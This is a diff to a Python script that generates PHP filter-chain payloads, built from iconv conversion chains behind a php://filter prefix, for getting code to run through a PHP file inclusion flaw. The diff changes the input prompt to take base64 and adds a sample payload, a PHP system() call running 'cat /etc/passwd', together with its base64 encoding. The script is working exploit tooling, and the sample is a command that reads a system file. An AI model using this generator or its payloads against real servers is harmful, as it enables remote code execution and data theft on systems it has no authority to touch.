@@ -64,7 +64,7 @@ c={
     'z':'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'
 }
 
-# <?=system('cat /etc/passwd');?>
+
 def exploit(payload):
     tmp=''
     payload_prefix='php://filter/convert.iconv.UTF8.UTF7|'
@@ -78,9 +78,12 @@ def exploit(payload):
     tmp+=payload_suffix
     return tmp
 
+
 def main():
-    payload=input('create payload: ')
+    # <?=system('cat /etc/passwd');?>  =>  PD89c3lzdGVtKGNhdCAvZXRjL3Bhc3N3ZCk7Pz4
+    payload=input('create payload (input base64): ')
     print(exploit(payload),end='')
+
 
 if __name__=='__main__':
     main()
